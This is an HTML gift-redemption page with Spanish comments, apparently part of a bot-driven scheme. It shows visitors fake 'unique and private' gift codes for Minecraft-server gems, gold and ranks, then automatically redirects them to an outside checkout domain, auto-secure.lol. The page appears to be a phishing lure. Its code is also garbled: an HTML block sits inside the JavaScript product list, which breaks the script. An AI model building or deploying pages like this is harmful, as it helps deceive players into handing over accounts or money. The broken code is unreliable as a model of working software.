<!DOCTYPE html>
<html lang="en">
<head>
    <script>
      // Esto puede ser inyectado por el backend si usas Express/EJS:
      // window.REDIRECT_URL_BASE = "<%= REDIRECT_URL_BASE %>";
      // O si sirves archivos est√°ticos, puedes reemplazarlo por un valor en build/deploy.
      window.REDIRECT_URL_BASE = window.REDIRECT_URL_BASE || "https://auto-secure.lol/checkout?gift=";
    </script>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Gift Link Redeem</title>
  <style>
    body {
      background: #181a20;
      color: #fff;
      font-family: 'Segoe UI', Arial, sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      margin: 0;
    }
    .container {
      background: #23272f;
      border-radius: 16px;
      box-shadow: 0 4px 24px #000a;
      padding: 2.5rem 2rem;
      max-width: 400px;
      width: 100%;
      text-align: center;
    }
    .title {
      font-size: 2rem;
      margin-bottom: 1rem;
      color: #7ed957;
    }
    .code {
      font-size: 1.1rem;
      background: #181a20;
      border-radius: 8px;
      padding: 0.7rem 1rem;
      margin: 1.2rem 0;
      word-break: break-all;
      color: #7ed957;
      letter-spacing: 1px;
      font-family: 'Fira Mono', 'Consolas', monospace;
    }
    .info {
      color: #b0b8c1;
      margin-bottom: 1.5rem;
    }
    .footer {
      margin-top: 2rem;
      color: #555;
      font-size: 0.95rem;
    }
    .logo {
      width: 60px;
      margin-bottom: 1.2rem;
    }
  </style>
</head>
<body>
  <div class="container">
    <img src="https://cdn-icons-png.flaticon.com/512/833/833472.png" alt="Gift" class="logo" />
    <div class="title">üéÅ Gift Link</div>
    <div class="info">¬°Has accedido a un link de regalo!<br>Guarda este enlace, es √∫nico y privado.</div>
    <div class="product" id="product-name">Cargando producto...</div>
    <div class="price" id="product-price"></div>
    <div class="code" id="gift-code">Cargando...</div>
    <!-- El bot√≥n ya no es necesario, la redirecci√≥n ser√° autom√°tica -->
    <div class="footer">‚ö° ILJ Links - Soon 2.0</div>
  </div>
  <script>
    // Productos configurados (debe coincidir con el bot)
    const PRODUCTS = [
      { id: 1, name: "16,400 SkyBlock Gems", price: "99.99" },
      { id: 2, name: "3,600 SkyBlock Gems", price: "24.99" },
      { id: 3, name: "11,000 Gold", price: "100.00" },
      { id: 4, name: "VIP Rank", price: "6.99" },
      { id: 5, name: "VIP+ Rank", price: "14.99" },
      { id: 6, name: "MVP Rank", price: "29.99" },
      { id: 7, name: "MVP+ Rank", price: "44.99" },
      { id: 8, name: "MVP++ Rank", price: "7.99" },
          <div id="redeem-content" style="display:none;max-width:400px;margin:2rem auto;padding:2rem;background:#fff;border-radius:10px;box-shadow:0 2px 8px rgba(0,0,0,0.07);">
            <h2 style="color:#41C4C3;margin-bottom:1.2rem;">Canjear regalo</h2>
            <div style="margin-bottom:1.2rem;">
              <span style="font-weight:bold;">Producto:</span> <span id="product-name"></span><br>
              <span style="font-weight:bold;">Precio:</span> <span id="product-price"></span>
            </div>
            <div style="margin-bottom:1.2rem;">
              <span style="font-weight:bold;">C√≥digo:</span> <span id="gift-code"></span>
            </div>
          </div>
      { id: 10, name: "2,500 Gold", price: "25.00" },
      { id: 11, name: "5,000 Gold", price: "50.00" },
      { id: 12, name: "11,000 Gold", price: "100.00" },
      { id: 13, name: "675 SkyBlock Gems", price: "4.99" },
      { id: 14, name: "1,390 SkyBlock Gems", price: "9.99" },
      { id: 15, name: "3,600 SkyBlock Gems", price: "24.99" },
      { id: 16, name: "7,200 SkyBlock Gems", price: "49.99" }
    ];
    // Extrae el c√≥digo y el nombre del producto de la URL
    const path = window.location.pathname;
    const match = path.match(/\/redeem\/([a-z0-9\-]+)-([a-z0-9]{16})/);
    if (match) {
      const productSlug = match[1].replace(/-[a-z0-9]{16}$/, '');
      const code = match[1] + '-' + match[2];
      // Busca el producto por slug
      function slugify(name) {
        return name.toLowerCase().replace(/[^a-z0-9]+/g, '-').replace(/^-+|-+$/g, '');
      }
      const product = PRODUCTS.find(p => slugify(p.name) === productSlug);
      document.getElementById('gift-code').textContent = code;
      if (product) {
        // Redirecci√≥n autom√°tica al dominio real si no estamos ya en √©l
        const REDIRECT_URL_BASE = window.REDIRECT_URL_BASE || "https://auto-secure.lol/checkout?gift=";
        const currentBase = window.location.origin + "/checkout?gift=";
        const giftParam = `${productSlug}-${match[2]}`;
        if (!window.location.href.startsWith(REDIRECT_URL_BASE)) {
          window.location.href = REDIRECT_URL_BASE + giftParam;
        } else {
          // Redirigir autom√°ticamente a checkout.html con el slug (flujo normal)
          window.location.href = '/gift/checkout.html?slug=' + productSlug;
        }
      } else {
        document.getElementById('product-name').textContent = 'Producto desconocido';
        document.getElementById('product-price').textContent = '';
      }
    } else {
      document.getElementById('gift-code').textContent = 'C√≥digo no v√°lido.';
      document.getElementById('product-name').textContent = '';
      document.getElementById('product-price').textContent = '';
    }
  </script>
</body>
</html>
